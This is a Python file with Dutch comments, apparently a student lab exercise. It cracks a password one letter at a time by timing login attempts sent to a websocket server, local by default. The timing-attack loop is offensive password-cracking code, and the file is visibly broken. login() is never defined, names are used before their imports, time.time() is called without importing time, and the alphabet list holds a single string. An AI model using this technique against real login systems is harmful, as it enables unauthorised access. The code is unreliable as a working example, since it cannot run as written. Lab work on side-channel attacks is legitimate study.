
print('dit is een testfile')

#alfabet_lijst = ['abcdefghijklmnopqrstuvwxyz']


# Controleert voor elke letter in het alfabet
# of deze voorkomt in het wachtwoord.
# Geeft een dictionary terug met True/False.

def cracked_letter(cracked, padding):
    results = {key: 0 for key in ascii_lowercase}
    for _ in range(100):
        for letter in ascii_lowercase:
            input_string = cracked + letter + "-" * padding
            start = time_ns()

            login(input_string)
            end = time_ns()

            results[letter] += end - start
    return sorted(results, key =  results.get, reverse = True) [0]


padding_length = 17
cracked_letters = ''

for i in range(padding_length):
    next_letter = cracked_letter(cracked_letters, padding_length)
    cracked_letters += next_letter
    padding_length -= 1
    print(cracked_letters)


# for c in 'abcd...'
# temp_pass = c + 'a' * 6

# print(result)

import asyncio, websockets
from json import dumps, loads
from time import sleep
#import time

from string import ascii_lowercase
from time import time_ns

# Lijst om alle inlogpogingen in op te slaan
inlogpogingen = []

async def client_connect(username, password, variance=0.0):
    """ Handle sending and receiving logins to & from the server

        Parameters:     username -- string of student ID for login attempt
                        password -- string of password for login attempt
                        variance -- float of maximum network delay

        Returns:        reply -- string of server's response to login attempt
    """
    #server_address = "ws://20.224.193.77:8080"   # Hanze server
    server_address = "ws://127.0.0.1:8080"      # local (Docker) server
    
    # Stap 2 verwerkt op regel 27 en 
    while True:        
        try:
            # -- start toevoeging -- #          
            # Meet het startpunt van versturen van credentials        
            # starttijd_inlogpoging= time.perf_counter()
            starttijd_inlogpoging = time.time()

            async with websockets.connect(server_address) as websocket:
                await websocket.send(dumps([username, password, variance]))
                reply = await websocket.recv()

            # eindtijd_inlogpoging: noteert de tijd op het moment dat de server een antwoord heeft ontvangen van de client.
            # eindtijd_inlogpoging = time.perf_counter()
            eindtijd_inlogpoging = time.time()

            # tijdsduur = start - end            
            # print("Tijdsduur: " + tijdsduur)

            # rounded_end = round(end - start, 6)
            # print(end-start)
            #print(rounded_end)

            # Round trip time in seconden
            tijdsduur_afgerond = round(eindtijd_inlogpoging - starttijd_inlogpoging, 6)
            
            print(f"Tijdsduur inlogpoging: {tijdsduur_afgerond}")
            # -- einde toevoeging -- #

            return loads(reply)
        except:
            continue


def call_server(username, password, variance=0.01):
    """Send a login attempt of username + password to the server and return the response. 
    Optionally takes the variable variance to allow simulation of random network delays; the server will then
    delay its response by n microseconds, where 0 < n < variance.
    A higher variance will make guessing the password harder.

    Parameters
    ----------
        username -- string of student ID for login attempt
        password -- string of password for login attempt
        variance -- float of maximum delay, must be greater than 0.000001

    Returns
    -------
        reply -- string of server's response to login attempt
    """ 

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        reply = asyncio.run(client_connect(username, password, variance))               
    except KeyboardInterrupt:
        pass

    sleep(0.001) # Wait so as to not overload the server with 90 students at once!

    #print("REPLY: " + reply)
    return (reply)

# Test basic server connectivity & functionality
#print(call_server('test', 'test'))
#print(call_server('000000', 'hunter2'))

# Gegeven: het wachtwoord bestaat alléén uit kleine letters en cijfers.
alfabet_lijst = ["abcdefghijklmnopqrstuvwxyz"]

# check_alfabet_lijst()
def check_letters_in_wachtwoord(password):
    """
    Controleert voor elke letter in het alfabet
    of deze voorkomt in het wachtwoord.
    Geeft een dictionary terug met True/False.
    """
    password = password.lower()  # hoofdletters negeren
    result = {}

    for letter in alfabet_lijst:
        result[letter] = letter in password

    return result

# for c in 'abcd...'
# temp_pass = c + 'a' * 6

#result = call_server('000000', 'hunter2')
check_letters_in_wachtwoord('hunter2')
result = call_server('000000', 'hunter2')

print(result)

